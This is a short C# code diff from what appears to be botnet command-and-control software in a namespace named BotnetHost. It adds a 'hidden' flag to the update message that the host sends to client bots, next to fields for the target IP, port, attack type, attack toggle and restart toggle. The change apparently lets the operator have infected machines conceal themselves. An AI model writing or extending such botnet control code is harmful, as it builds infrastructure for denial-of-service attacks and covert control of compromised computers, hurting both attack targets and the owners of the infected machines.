@@ -24,6 +24,7 @@ namespace BotnetHost
         public string type = "TCP";
         public Boolean attack = false;
         public Boolean restart = false;
+        public Boolean hidden = false;
         public Boolean hasUpdate = true;
 
         // Constructor
@@ -37,7 +38,7 @@ namespace BotnetHost
         // Build update for client
         public string buildUpdate(string[] otherUpdates)
         {
-            string[] updates = new string[8 + otherUpdates.Length];
+            string[] updates = new string[9 + otherUpdates.Length];
 
             updates[0] = "IP: " + hostOrIP + "";
             updates[1] = "Port: " + port + "";
@@ -47,6 +48,7 @@ namespace BotnetHost
             updates[5] = "Type: " + type + "";
             updates[6] = "Attack: " + attack.ToString() + "";
             updates[7] = "Restart: " + restart.ToString() + "";
+            updates[8] = "Hidden: " + hidden.ToString() + "";
 
             string output = "";
             int updateCount = 0;
